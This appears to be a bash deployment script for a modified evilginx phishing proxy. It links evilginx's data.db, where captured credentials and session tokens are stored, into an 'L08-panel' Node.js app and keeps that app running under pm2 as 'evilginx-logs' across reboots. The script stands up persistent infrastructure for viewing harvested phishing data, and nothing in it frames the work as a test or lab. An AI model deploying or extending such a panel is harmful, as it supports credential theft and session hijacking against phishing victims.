#!/bin/bash

# Define directories
MAIN_DIR=~/evilginx.modified
PANEL_DIR=$MAIN_DIR/L08-panel
DB_FILE=$MAIN_DIR/config/data.db
LINK_NAME=$PANEL_DIR/data.db

# Navigate to the L08-panel directory
cd $PANEL_DIR || { echo "L08-panel directory not found!"; exit 1; }

# Create a symbolic link for data.db
if [ ! -L $LINK_NAME ]; then
  ln -s $DB_FILE $LINK_NAME
  echo "Symbolic link created for data.db"
else
  echo "Symbolic link already exists"
fi

# Install npm packages
echo "Installing npm packages..."
npm install

# Start the Node.js server using pm2
echo "Starting Node.js server with pm2..."
pm2 start app.js --name evilginx-logs

# Save the pm2 process list to resurrect after reboot
pm2 save

# Print the status of pm2 processes
pm2 status

echo "Setup completed. The server is running in the background."
